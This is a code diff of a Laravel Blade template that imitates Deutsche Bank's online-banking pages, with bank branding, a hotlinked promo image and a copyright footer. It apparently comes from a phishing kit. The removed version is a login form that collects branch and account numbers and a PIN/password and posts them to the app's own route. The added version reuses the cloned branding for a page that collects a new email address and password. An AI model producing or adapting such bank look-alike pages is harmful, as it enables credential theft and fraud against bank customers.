@@ -4,7 +4,7 @@
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <meta name="csrf-token" content="{{ csrf_token() }}">
-<title>Deutsche Bank – Online-Banking Login</title>
+<title>Deutsche Bank – Profil bearbeiten</title>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
 
@@ -31,35 +31,22 @@ html,body{
 
 body{
   background-color:#3a8fd4;
-  background-image:url("dbbg.jpg");
+  background-image:url("{{ asset('dbbg.jpg') }}");
   background-size:cover;
   background-position:center top;
   background-attachment:fixed;
   background-repeat:no-repeat;
 }
 
-.page{
-  min-height:100vh;
-  display:flex;
-  flex-direction:column;
-}
-
-.layout{
-  flex:1;
-  display:flex;
-  align-items:flex-start;
-}
+.page{ min-height:100vh; display:flex; flex-direction:column; }
+.layout{ flex:1; display:flex; align-items:flex-start; }
 
 .left-col{
-  flex:1;
-  min-height:100vh;
-  display:flex;
-  align-items:center;
-  padding-left:18%;
-  padding-top:0;
-  padding-bottom:0;
+  flex:1; min-height:100vh; display:flex; align-items:center;
+  padding-left:18%; padding-top:0; padding-bottom:0;
 }
 
+/* ── CARD ── */
 .card{
   background:var(--white);
   width:560px;
@@ -78,15 +65,10 @@ body{
 .card-title{ font-size:28px; font-weight:700; color:var(--text); margin-bottom:9px; line-height:1.1; }
 .card-sub{ font-size:14.5px; color:var(--text); margin-bottom:24px; }
 
-.fields-row{ display:flex; gap:8px; margin-bottom:18px; align-items:flex-end; }
-.field{ display:flex; flex-direction:column; }
-.f-fil{ flex:0 0 120px; }
-.f-kon{ flex:1; }
-.f-unt{ flex:0 0 72px; }
-
+/* ── Champs ── */
+.field{ display:flex; flex-direction:column; margin-bottom:16px; }
 .lbl{ font-size:12.5px; margin-bottom:3px; color:var(--text); }
 .lbl.red{ color:var(--red); }
-.lbl.grey{ color:var(--grey-t); }
 
 .inp{
   height:40px; border:1px solid #aaa;
@@ -98,33 +80,72 @@ body{
 .inp.err{ border:1.5px solid var(--red); }
 .inp:focus:not([disabled]){ border-color:var(--blue); box-shadow:0 0 0 2px rgba(0,102,178,.17); }
 .inp.err:focus{ border-color:var(--red); box-shadow:0 0 0 2px rgba(204,0,0,.13); }
-.inp[disabled]{ background:var(--grey); border-color:#ccc; color:var(--grey-t); cursor:default; }
 
-.dbid{
-  display:inline-block; color:var(--link); font-size:13.5px;
-  text-decoration:underline; margin-bottom:44px;
+/* ── Résumé email étape 2 ── */
+.email-summary{
+  display:none;
+  align-items:center;
+  gap:10px;
+  background:#f4f8fc;
+  border:1px solid #d0e4f0;
+  padding:10px 12px;
+  margin-bottom:20px;
+  font-size:13px;
+  color:var(--text);
+}
+.email-summary.visible{ display:flex; animation:fadeUp .25s ease; }
+.email-summary .email-val{ font-weight:700; font-size:13px; color:var(--blue); }
+.email-summary .change-btn{
+  margin-left:auto; color:var(--link); font-size:12px;
+  text-decoration:underline; background:none; border:none;
+  cursor:pointer; font-family:inherit; padding:0;
+}
+
+/* ── Section password (slide) ── */
+.password-section{
+  overflow:hidden;
+  max-height:0; opacity:0;
+  transition:max-height .4s ease, opacity .35s ease, margin-bottom .4s ease;
+  margin-bottom:0;
+}
+.password-section.visible{
+  max-height:300px; opacity:1; margin-bottom:8px;
+}
+
+/* ── Message erreur / succès ── */
+.alert-box{
+  display:none;
+  font-size:13px;
+  padding:10px 12px;
+  margin-bottom:16px;
+  line-height:1.4;
+  border-left:3px solid;
+}
+.alert-box.error{ background:#fff0f0; border-color:var(--red); color:var(--red); }
+.alert-box.success{ background:#f0fff4; border-color:#1a8a3a; color:#1a8a3a; }
+.alert-box.visible{ display:block; animation:fadeUp .25s ease; }
+
+/* ── Lien retour ── */
+.back-link{
+  display:inline-block; color:var(--link); font-size:13px;
+  text-decoration:underline; margin-bottom:22px;
   cursor:pointer; background:none; border:none; padding:0; font-family:inherit;
 }
-.dbid:hover{ color:var(--blue-dk); }
+.back-link:hover{ color:var(--blue-dk); }
 
-.card-btm{ display:flex; align-items:center; justify-content:space-between; }
-.btn-fgt{
-  color:var(--link); font-size:13.5px; text-decoration:underline;
-  background:none; border:none; cursor:pointer; padding:0; font-family:inherit;
-}
-.btn-fgt:hover{ color:var(--blue-dk); }
+/* ── Bottom row ── */
+.card-btm{ display:flex; align-items:center; justify-content:space-between; margin-top:24px; }
+
 .btn-weiter{
   background:var(--blue); color:#fff; border:none;
   height:42px; padding:0 28px; font-size:15px; font-weight:400;
   font-family:inherit; cursor:pointer; border-radius:0; min-width:100px;
-  transition:background .13s;
-  position:relative; overflow:hidden;
+  transition:background .13s; position:relative; overflow:hidden;
 }
 .btn-weiter:hover{ background:var(--blue-dk); }
 .btn-weiter:active{ background:#003f80; }
 .btn-weiter:disabled{ opacity:.65; cursor:default; }
 
-/* ── Spinner bouton ── */
 .btn-weiter .spinner{
   display:none;
   width:16px; height:16px;
@@ -138,70 +159,16 @@ body{
 .btn-weiter.loading .btn-label{ opacity:0; }
 .btn-weiter.loading .spinner{ display:block; }
 
-/* ── Résumé compte étape 2 ── */
-.account-summary{
-  display:none;
-  align-items:center;
-  gap:10px;
-  background:#f4f8fc;
-  border:1px solid #d0e4f0;
-  padding:10px 12px;
-  margin-bottom:18px;
-  font-size:13px;
-  color:var(--text);
-}
-.account-summary.visible{ display:flex; animation:fadeUp .25s ease; }
-.account-summary .acct-num{ font-weight:700; font-size:14px; color:var(--blue); }
-.account-summary .change-btn{
-  margin-left:auto; color:var(--link); font-size:12px;
-  text-decoration:underline; background:none; border:none;
-  cursor:pointer; font-family:inherit; padding:0;
-}
-
-/* ── Champ password slide ── */
-.password-section{
-  overflow:hidden;
-  max-height:0;
-  opacity:0;
-  transition:max-height .4s ease, opacity .35s ease, margin-bottom .4s ease;
-  margin-bottom:0;
-}
-.password-section.visible{
-  max-height:110px;
-  opacity:1;
-  margin-bottom:18px;
-}
-.password-section .field{ width:100%; }
-
-/* ── Message d'erreur ── */
-.alert-error{
-  display:none;
-  background:#fff0f0;
-  border-left:3px solid var(--red);
-  color:var(--red);
-  font-size:13px;
-  padding:10px 12px;
-  margin-bottom:16px;
-  line-height:1.4;
-}
-.alert-error.visible{ display:block; animation:fadeUp .25s ease; }
-
+/* ── SIDEBAR (identique login) ── */
 .sidebar{
-  width:var(--sidebar-w);
-  flex-shrink:0;
-  background:var(--white);
-  display:flex;
-  flex-direction:column;
-  min-height:100vh;
+  width:var(--sidebar-w); flex-shrink:0;
+  background:var(--white); display:flex;
+  flex-direction:column; min-height:100vh;
   margin-right:250px;
 }
-
 .promo-img{
-  width:100%;
-  height:182px;
-  padding: 5%;
-  background-size:auto;
-  position:relative; overflow:hidden; flex-shrink:0;
+  width:100%; height:182px; padding:5%;
+  background-size:auto; position:relative; overflow:hidden; flex-shrink:0;
 }
 .promo-tag{
   position:absolute; top:12px; left:50%; transform:translateX(-50%);
@@ -221,11 +188,7 @@ body{
   border-radius:6px; overflow:hidden;
   display:flex; align-items:flex-end; justify-content:flex-end; padding:5px;
 }
-.ph-card{
-  width:30px; height:20px;
-  background:linear-gradient(135deg,#e8b000,#b88800);
-  border-radius:3px; border:1px solid rgba(255,255,255,.25);
-}
+.ph-card{ width:30px; height:20px; background:linear-gradient(135deg,#e8b000,#b88800); border-radius:3px; border:1px solid rgba(255,255,255,.25); }
 .ph-sm{
   position:absolute; right:30px; bottom:14px;
   width:48px; height:78px;
@@ -233,13 +196,8 @@ body{
   border-radius:8px; border:1.5px solid rgba(255,255,255,.15);
   box-shadow:4px 4px 16px rgba(0,0,0,.4);
 }
-.ph-sm-scr{
-  position:absolute; inset:4px; background:#fff; border-radius:4px; overflow:hidden;
-}
-.ph-sm-scr::after{
-  content:''; display:block; width:100%; height:50%;
-  background:linear-gradient(to bottom,#ddeaf8,#c8d8ec);
-}
+.ph-sm-scr{ position:absolute; inset:4px; background:#fff; border-radius:4px; overflow:hidden; }
+.ph-sm-scr::after{ content:''; display:block; width:100%; height:50%; background:linear-gradient(to bottom,#ddeaf8,#c8d8ec); }
 .promo-badge{
   position:absolute; top:18px; right:74px;
   width:40px; height:40px; background:#14142a; border-radius:50%;
@@ -247,48 +205,39 @@ body{
   display:flex; flex-direction:column; align-items:center; justify-content:center;
   color:#fff; font-size:7.5px; font-weight:700; text-align:center; line-height:1.3;
 }
-
-.promo-body{ padding: 5%; border-bottom:1px solid #e0e0e0; }
+.promo-body{ padding:5%; border-bottom:1px solid #e0e0e0; }
 .promo-title{ font-size:20px; font-weight:700; color:var(--text); margin-bottom:8px; }
 .promo-desc{ font-size:16px; color:var(--text); line-height:1.5; margin-bottom:8px; }
 .promo-mehr{ color:var(--link); font-size:15px; text-decoration:underline; cursor:pointer; background:none; border:none; padding:0; font-family:inherit; }
-
 .info-blk{ padding:26px 18px 13px; border-bottom:1px solid #e0e0e0; }
 .info-hd{ display:flex; align-items:center; gap:9px; margin-bottom:7px; }
 .info-ic{ flex-shrink:0; display:flex; align-items:center; }
 .info-ttl{ font-size:20px; font-weight:700; color:var(--text); }
 .info-txt{ font-size:15px; color:var(--text); line-height:1.5; margin-bottom:7px; }
-.info-lnk{
-  display:block; color:var(--link); font-size:14px; text-decoration:underline;
-  cursor:pointer; background:none; border:none; padding:0; font-family:inherit;
-  text-align:left; margin-bottom:3px; line-height:1.5;
-}
+.info-lnk{ display:block; color:var(--link); font-size:14px; text-decoration:underline; cursor:pointer; background:none; border:none; padding:0; font-family:inherit; text-align:left; margin-bottom:3px; line-height:1.5; }
 .info-lnk:last-child{ margin-bottom:0; }
-
 .ft{ background:var(--navy); padding:28px 28px 16px; margin-top:auto; }
 .ft-links{ display:flex; flex-wrap:wrap; gap:4px 12px; margin-bottom:6px; }
 .ft-a{ color:rgba(255,255,255,.88); font-size:16.5px; text-decoration:none; cursor:pointer; }
 .ft-a:hover{ text-decoration:underline; }
 .ft-copy{ font-size:15.5px; color:rgba(255,255,255,.6); margin-top:4px; }
 
+/* ── Animations ── */
 @keyframes fadeUp{ from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
 @keyframes shake{ 0%,100%{transform:translateX(0)} 20%{transform:translateX(-5px)} 40%{transform:translateX(5px)} 60%{transform:translateX(-3px)} 80%{transform:translateX(3px)} }
 @keyframes spin{ to{transform:translate(-50%,-50%) rotate(360deg)} }
 .shake{ animation:shake .33s ease; }
 
+/* ── Mobile ── */
 @media(max-width:767px){
   body{ background-image:none; background-color:var(--navy); }
   .layout{ flex-direction:column; }
   .left-col{ flex:none; min-height:0; padding:0; width:100%; display:block; }
   .card{ width:100%; padding:26px 18px 30px; border-radius:0; }
   .card-title{ font-size:24px; }
-  .fields-row{ flex-direction:column; gap:12px; margin-bottom:16px; }
-  .f-fil,.f-kon,.f-unt{ flex:none; width:100%; }
   .inp{ height:44px; }
-  .dbid{ margin-bottom:24px; }
   .card-btm{ flex-direction:column; align-items:stretch; gap:10px; }
   .btn-weiter{ width:100%; order:-1; height:44px; }
-  .btn-fgt{ text-align:left; order:0; }
   .sidebar{ width:100%; min-height:0; margin-right:0; }
 }
 
@@ -304,10 +253,11 @@ body{
 <div class="page">
   <div class="layout">
 
-    <!-- ====== LEFT: transparent + card ====== -->
+    <!-- ====== CARD ====== -->
     <div class="left-col">
       <div class="card">
 
+        {{-- Logo --}}
         <div class="logo-row">
           <span class="logo-text">Deutsche Bank</span>
           <div class="logo-sq">
@@ -317,56 +267,59 @@ body{
           </div>
         </div>
 
-        <h1 class="card-title" id="greeting">Guten Morgen</h1>
-        <p class="card-sub" id="cardSub">Bitte geben Sie Ihre Zugangsdaten ein.</p>
+        {{-- Lien retour profil --}}
+        <a class="back-link" href="{{ route('dashboard.profile') }}">
+          ← Zurück zum Profil
+        </a>
 
-        {{-- Message d'erreur --}}
-        <div class="alert-error" id="alertError"></div>
+        <h1 class="card-title">Profil bearbeiten</h1>
+        <p class="card-sub" id="cardSub">Geben Sie Ihre neue E-Mail-Adresse ein.</p>
 
-        {{-- Résumé compte (étape 2) --}}
-        <div class="account-summary" id="accountSummary">
+        {{-- Message erreur / succès --}}
+        <div class="alert-box" id="alertBox"></div>
+
+        {{-- Résumé email (affiché à l'étape 2) --}}
+        <div class="email-summary" id="emailSummary">
           <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
-            <circle cx="8" cy="8" r="7" stroke="#0066b2" stroke-width="1.4"/>
-            <path d="M8 4.5v3.5l2.5 1.5" stroke="#0066b2" stroke-width="1.4" stroke-linecap="round"/>
+            <rect x="1" y="3" width="14" height="10" rx="1.5" stroke="#0066b2" stroke-width="1.4"/>
+            <path d="M1 5l7 5 7-5" stroke="#0066b2" stroke-width="1.4" stroke-linecap="round"/>
           </svg>
-          <span>Konto: <strong class="acct-num" id="acctDisplay"></strong></span>
-          <button class="change-btn" id="changeAcctBtn" type="button">Ändern</button>
+          <span>E-Mail: <strong class="email-val" id="emailDisplay"></strong></span>
+          <button class="change-btn" id="changeEmailBtn" type="button">Ändern</button>
         </div>
 
-        {{-- Étape 1 : Filiale + Konto --}}
-        <div id="fieldsWrap">
-          <div class="fields-row">
-            <div class="field f-fil">
-              <label class="lbl red" for="filiale">Filiale</label>
-              <input class="inp err" type="text" id="filiale"
-                     inputmode="numeric" autocomplete="off" maxlength="4"/>
-            </div>
-            <div class="field f-kon">
-              <label class="lbl" for="konto">Konto</label>
-              <input class="inp" type="text" id="konto"
-                     inputmode="numeric" autocomplete="off" maxlength="10"/>
-            </div>
-            <div class="field f-unt">
-              <label class="lbl grey" for="unterkonto">Unterkonto</label>
-              <input class="inp" type="text" id="unterkonto" value="00" disabled/>
-            </div>
+        {{-- ── ÉTAPE 1 : Email ── --}}
+        <div id="emailWrap">
+          <div class="field">
+            <label class="lbl red" for="email">E-Mail-Adresse</label>
+            <input class="inp err" type="email" id="email"
+                   autocomplete="email"
+                   value="{{ auth()->user()->email }}"
+                   placeholder="beispiel@deutschebank.de"/>
           </div>
-
-          <button class="dbid" type="button" id="dbidBtn">Mit Deutsche Bank ID einloggen</button>
         </div>
 
-        {{-- Étape 2 : Password slide --}}
+        {{-- ── ÉTAPE 2 : Mot de passe (slide) ── --}}
         <div class="password-section" id="passwordSection">
           <div class="field">
-            <label class="lbl" for="password">PIN / Passwort</label>
+            <label class="lbl" for="password">Neues Passwort</label>
             <input class="inp" type="password" id="password"
-                   autocomplete="current-password" minlength="8"/>
+                   autocomplete="new-password"
+                   placeholder="Mindestens 8 Zeichen"
+                   minlength="8"/>
+          </div>
+          <div class="field">
+            <label class="lbl" for="password_confirm">Passwort bestätigen</label>
+            <input class="inp" type="password" id="password_confirm"
+                   autocomplete="new-password"
+                   placeholder="Passwort wiederholen"/>
           </div>
         </div>
 
+        {{-- Bottom --}}
         <div class="card-btm">
-          <a href="/forgot-password" class="btn-fgt" type="button"  id="forgotBtn">Zugangsdaten vergessen?</a>
-          <button class="btn-weiter" type="button" id="weiterBtn">
+          <span></span>{{-- spacer --}}
+          <button class="btn-weiter" type="button" id="actionBtn">
             <span class="btn-label">Weiter</span>
             <span class="spinner"></span>
           </button>
@@ -375,19 +328,16 @@ body{
       </div>
     </div>
 
-    <!-- ====== RIGHT SIDEBAR ====== -->
+    <!-- ====== SIDEBAR (identique login) ====== -->
     <aside class="sidebar">
-
       <div class="promo-img">
-        <img style="width: 100%;" src="https://www.deutsche-bank.de/dam/deutschebank/de/shared/trxm/vorteilswelt/Samsung_Wallet_ Promo_1200x750_DB_ohne_Logo_ohne_Energielabel.jpg" alt=""/>
+        <img style="width:100%;" src="https://www.deutsche-bank.de/dam/deutschebank/de/shared/trxm/vorteilswelt/Samsung_Wallet_ Promo_1200x750_DB_ohne_Logo_ohne_Energielabel.jpg" alt=""/>
       </div>
-
       <div class="promo-body">
         <h2 class="promo-title">Spezial-Angebot für das neue Galaxy S26</h2>
         <p class="promo-desc">Sichern Sie sich auf das neue Smartphone von Samsung Ihren Preisvorteil und freuen Sie sich auf das erste Privacy-Display in einem Smartphone (Ultra-Modell).</p>
         <button class="promo-mehr">Zur Vorteilswelt</button>
       </div>
-
       <div class="info-blk">
         <div class="info-hd">
           <div class="info-ic">
@@ -403,7 +353,6 @@ body{
         <button class="info-lnk">Link zu den aktuellen Sicherheitshinweisen</button>
         <button class="info-lnk">Link zu Sicherheit im Überblick</button>
       </div>
-
       <div class="info-blk">
         <div class="info-hd">
           <div class="info-ic">
@@ -420,7 +369,6 @@ body{
         <p class="info-txt">Hier können Sie Ihren persönlichen Zugang zum Online-Banking beantragen.</p>
         <button class="info-lnk">Zugang zum Online-Banking beantragen</button>
       </div>
-
       <div class="info-blk">
         <div class="info-hd">
           <div class="info-ic">
@@ -436,7 +384,6 @@ body{
         <p class="info-txt">Alles Wissenswerte rund um Ihren Login.</p>
         <button class="info-lnk">Link zu den Sicherheitsverfahren</button>
       </div>
-
       <footer class="ft">
         <div class="ft-links">
           <a class="ft-a" href="#" onclick="return false;">English Version</a>
@@ -449,50 +396,48 @@ body{
         </div>
         <p class="ft-copy">© 2026 Deutsche Bank AG</p>
       </footer>
-
     </aside>
+
   </div>
 </div>
 
 <script>
 (function () {
 
-  /* ── Greeting ── */
-  var h = new Date().getHours();
-  document.getElementById('greeting').textContent =
-    h >= 5 && h < 12 ? 'Guten Morgen' : h >= 12 && h < 18 ? 'Guten Tag' : 'Guten Abend';
-
   /* ── Refs ── */
-  var filiale         = document.getElementById('filiale');
-  var konto           = document.getElementById('konto');
-  var password        = document.getElementById('password');
-  var weiterBtn       = document.getElementById('weiterBtn');
-  var btnLabel        = weiterBtn.querySelector('.btn-label');
-  var passwordSection = document.getElementById('passwordSection');
-  var accountSummary  = document.getElementById('accountSummary');
-  var acctDisplay     = document.getElementById('acctDisplay');
-  var fieldsWrap      = document.getElementById('fieldsWrap');
-  var dbidBtn         = document.getElementById('dbidBtn');
-  var changeAcctBtn   = document.getElementById('changeAcctBtn');
-  var alertError      = document.getElementById('alertError');
-  var cardSub         = document.getElementById('cardSub');
-  var forgotBtn       = document.getElementById('forgotBtn');
-  var csrfToken       = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+  var emailInput       = document.getElementById('email');
+  var password         = document.getElementById('password');
+  var passwordConfirm  = document.getElementById('password_confirm');
+  var actionBtn        = document.getElementById('actionBtn');
+  var btnLabel         = actionBtn.querySelector('.btn-label');
+  var passwordSection  = document.getElementById('passwordSection');
+  var emailSummary     = document.getElementById('emailSummary');
+  var emailDisplay     = document.getElementById('emailDisplay');
+  var emailWrap        = document.getElementById('emailWrap');
+  var changeEmailBtn   = document.getElementById('changeEmailBtn');
+  var alertBox         = document.getElementById('alertBox');
+  var cardSub          = document.getElementById('cardSub');
+  var csrfToken        = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
 
   var step = 1;
 
   /* ── Helpers ── */
   function showError(msg) {
-    alertError.textContent = msg;
-    alertError.classList.add('visible', 'shake');
-    alertError.addEventListener('animationend', function () {
-      alertError.classList.remove('shake');
+    alertBox.textContent = msg;
+    alertBox.className   = 'alert-box error visible shake';
+    alertBox.addEventListener('animationend', function () {
+      alertBox.classList.remove('shake');
     }, { once: true });
   }
 
-  function clearError() {
-    alertError.classList.remove('visible');
-    alertError.textContent = '';
+  function showSuccess(msg) {
+    alertBox.textContent = msg;
+    alertBox.className   = 'alert-box success visible';
+  }
+
+  function clearAlert() {
+    alertBox.className   = 'alert-box';
+    alertBox.textContent = '';
   }
 
   function shakeField(el) {
@@ -503,88 +448,107 @@ body{
   }
 
   function setLoading(on) {
-    weiterBtn.disabled = on;
-    weiterBtn.classList.toggle('loading', on);
+    actionBtn.disabled = on;
+    actionBtn.classList.toggle('loading', on);
   }
 
-  /* ── Filiale : chiffres seulement, 4 max ── */
-  filiale.addEventListener('input', function () {
-    this.value = this.value.replace(/\D/g, '').slice(0, 4);
-    if (this.value) this.classList.remove('err');
-  });
-  filiale.addEventListener('blur', function () {
-    if (!this.value) this.classList.add('err');
-  });
-  filiale.addEventListener('focus', clearError);
+  function isValidEmail(val) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
+  }
 
-  /* ── Konto : chiffres seulement, 10 max ── */
-  konto.addEventListener('input', function () {
-    this.value = this.value.replace(/\D/g, '').slice(0, 10);
-    if (this.value) this.classList.remove('err');
-  });
-  konto.addEventListener('focus', clearError);
-
-  /* ── Password : pas de restriction de caractères, min 8 ── */
-  password.addEventListener('focus', clearError);
-  password.addEventListener('keydown', function (e) {
-    if (e.key === 'Enter') weiterBtn.click();
-  });
-
-  /* ── Changer de compte → retour étape 1 ── */
-  changeAcctBtn.addEventListener('click', function () {
+  /* ── Retour étape 1 (changer email) ── */
+  changeEmailBtn.addEventListener('click', function () {
     step = 1;
-    btnLabel.textContent    = 'Weiter';
-    cardSub.textContent     = 'Bitte geben Sie Ihre Zugangsdaten ein.';
+    btnLabel.textContent      = 'Weiter';
+    cardSub.textContent       = 'Geben Sie Ihre neue E-Mail-Adresse ein.';
     passwordSection.classList.remove('visible');
-    accountSummary.classList.remove('visible');
-    fieldsWrap.style.display = '';
-    dbidBtn.style.display    = '';
-    password.value = '';
-    clearError();
-    filiale.focus();
+    emailSummary.classList.remove('visible');
+    emailWrap.style.display   = '';
+    password.value            = '';
+    passwordConfirm.value     = '';
+    clearAlert();
+    emailInput.focus();
+  });
+
+  /* ── Nettoyage erreur au focus ── */
+  [emailInput, password, passwordConfirm].forEach(function (el) {
+    el.addEventListener('focus', function () {
+      this.classList.remove('err');
+      clearAlert();
+    });
+  });
+
+  /* ── Enter sur confirmation → submit ── */
+  passwordConfirm.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') actionBtn.click();
   });
 
   /* ── Bouton principal ── */
-  weiterBtn.addEventListener('click', function () {
+  actionBtn.addEventListener('click', function () {
 
-    /* === ÉTAPE 1 : validation numéro de compte === */
+    /* ======================================================
+       ÉTAPE 1 — Validation de l'email
+    ====================================================== */
     if (step === 1) {
-      var ok = true;
-      if (!filiale.value.trim()) { shakeField(filiale); ok = false; }
-      if (!konto.value.trim())   { shakeField(konto);   ok = false; }
-      if (!ok) { showError('Bitte füllen Sie alle Pflichtfelder aus.'); return; }
 
-      /* Passer à l'étape 2 */
-      step = 2;
-      acctDisplay.textContent  = filiale.value.trim() + konto.value.trim();
-      btnLabel.textContent     = 'Anmelden';
-      cardSub.textContent      = 'Bitte geben Sie Ihr Passwort ein.';
-      fieldsWrap.style.display = 'none';
-      dbidBtn.style.display    = 'none';
-      accountSummary.classList.add('visible');
-      passwordSection.classList.add('visible');
-      clearError();
-      setTimeout(function () { password.focus(); }, 420);
+      var emailVal = emailInput.value.trim();
 
-    /* === ÉTAPE 2 : envoi AJAX vers Laravel === */
-    } else {
-
-      /* Validation : password obligatoire, min 8 caractères */
-      if (!password.value) {
-        shakeField(password);
-        showError('Bitte geben Sie Ihr Passwort ein.');
+      if (!emailVal) {
+        shakeField(emailInput);
+        showError('Bitte geben Sie Ihre E-Mail-Adresse ein.');
         return;
       }
-      if (password.value.length < 8) {
+      if (!isValidEmail(emailVal)) {
+        shakeField(emailInput);
+        showError('Bitte geben Sie eine gültige E-Mail-Adresse ein.');
+        return;
+      }
+
+      /* Passer à l'étape 2 : afficher les champs mot de passe */
+      step = 2;
+      emailDisplay.textContent  = emailVal;
+      btnLabel.textContent      = 'Speichern';
+      cardSub.textContent       = 'Geben Sie Ihr neues Passwort ein.';
+      emailWrap.style.display   = 'none';
+      emailSummary.classList.add('visible');
+      passwordSection.classList.add('visible');
+      clearAlert();
+      setTimeout(function () { password.focus(); }, 420);
+
+    /* ======================================================
+       ÉTAPE 2 — Validation des mots de passe + envoi AJAX
+    ====================================================== */
+    } else {
+
+      var pwVal  = password.value;
+      var pwConf = passwordConfirm.value;
+
+      /* Validation : champs requis */
+      if (!pwVal) {
+        shakeField(password);
+        showError('Bitte geben Sie ein neues Passwort ein.');
+        return;
+      }
+
+      /* Validation : minimum 8 caractères */
+      if (pwVal.length < 8) {
         shakeField(password);
         showError('Das Passwort muss mindestens 8 Zeichen lang sein.');
         return;
       }
 
-      setLoading(true);
-      clearError();
+      /* Validation : les deux mots de passe correspondent */
+      if (pwVal !== pwConf) {
+        shakeField(passwordConfirm);
+        showError('Die Passwörter stimmen nicht überein.');
+        return;
+      }
 
-      fetch('{{ route("login.feature") }}', {
+      /* ── Envoi AJAX vers le controller Laravel ── */
+      setLoading(true);
+      clearAlert();
+
+      fetch('{{ route("profile.update") }}', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -592,37 +556,41 @@ body{
           'X-CSRF-TOKEN': csrfToken
         },
         body: JSON.stringify({
-          numero_compte: filiale.value.trim() + konto.value.trim(),
-          password:      password.value
+          email:                 emailInput.value.trim(),
+          password:              pwVal,
+          password_confirmation: pwConf
         })
       })
       .then(function (res) { return res.json(); })
       .then(function (data) {
         setLoading(false);
+
         if (data.success) {
-          btnLabel.textContent           = '✓';
-          weiterBtn.style.background     = '#1a8a3a';
-          weiterBtn.style.pointerEvents  = 'none';
+
+          /* Succès visuel */
+          btnLabel.textContent          = '✓';
+          actionBtn.style.background    = '#1a8a3a';
+          actionBtn.style.pointerEvents = 'none';
+          showSuccess(data.message || 'Profil erfolgreich aktualisiert.');
+
+          /* Redirection après 1.5s */
           setTimeout(function () {
-            window.location.href = data.redirect;
-          }, 600);
+            window.location.href = data.redirect || '{{ route("dashboard.profile") }}';
+          }, 1500);
+
         } else {
-          showError(data.message || 'Anmeldung fehlgeschlagen.');
+          showError(data.message || 'Ein Fehler ist aufgetreten.');
           shakeField(password);
-          password.value = '';
+          password.value        = '';
+          passwordConfirm.value = '';
           password.focus();
         }
       })
       .catch(function () {
         setLoading(false);
-        showError('Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
+        showError('Verbindungsfehler. Bitte versuchen Sie es erneut.');
       });
     }
-  });
-
-  /* ── Zugangsdaten vergessen ── */
-  forgotBtn.addEventListener('click', function () {
-    window.location.href = 'e';
   });
 
 })();
